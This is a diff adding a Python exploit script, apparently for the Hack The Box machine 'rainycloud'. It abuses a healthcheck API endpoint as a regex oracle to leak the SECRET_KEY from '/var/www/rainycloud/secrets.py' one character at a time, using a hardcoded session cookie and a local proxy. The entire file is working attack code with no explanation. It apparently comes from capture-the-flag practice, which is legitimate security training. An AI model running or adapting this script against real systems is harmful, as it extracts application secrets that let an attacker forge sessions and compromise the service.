@@ -1,0 +1,26 @@
+import string
+import requests
+import json
+
+char = string.printable
+cookies = {'session':'eyJ1c2VybmFtZSI6ImdhcnkifQ.Y-3YcQ.Fyh9S1cu9whdscNszpylRPScXzA'}
+proxy = {'http': 'http://127.0.0.1:8010'}
+v = requests.Session()
+pattern = ""
+
+while True:
+    for c in char :
+        try:
+           rsp = v.post('http://dev.rainycloud.htb/api/healthcheck', {
+                'file' : '/var/www/rainycloud/secrets.py',
+                'type' : 'CUSTOM',
+                'pattern' : "^SECRET_KEY = '" + pattern + c + ".*"
+            }, cookies=cookies , proxies=proxy)
+           if json.loads(rsp.content)['result']:
+             pattern += c
+             print ("It Key:" + str(pattern))
+             break
+           else :
+               print("It wrong :" + str(c)  )
+        except Exception:
+                   print(rsp.content)
